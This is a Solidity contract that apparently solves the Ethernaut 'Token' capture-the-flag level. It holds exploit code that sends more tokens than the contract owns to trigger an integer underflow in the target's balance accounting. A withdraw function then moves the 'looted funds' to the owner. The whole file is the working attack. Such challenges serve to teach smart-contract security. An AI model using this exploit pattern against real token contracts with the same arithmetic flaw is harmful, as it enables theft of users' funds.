//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenExploit {
    IToken public implementation;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Token` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0xB4802b28895ec64406e45dB504149bfE79A38A57
    constructor(IToken _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    /// @notice Transfers an amount that causes a uint256 overflow
    function exploit() external onlyOwner {
        implementation.transfer(
            address(0),
            implementation.balanceOf(address(this)) + 1
        );
    }

    /// @notice Function for owner to safely withdraw looted funds from contract
    function withdraw() external onlyOwner {
        uint256 balanceOffset = type(uint256).max -
            implementation.balanceOf(owner);
        uint256 amount = implementation.balanceOf(address(this)) > balanceOffset
            ? balanceOffset
            : implementation.balanceOf(address(this));

        implementation.transfer(msg.sender, amount);
    }
}
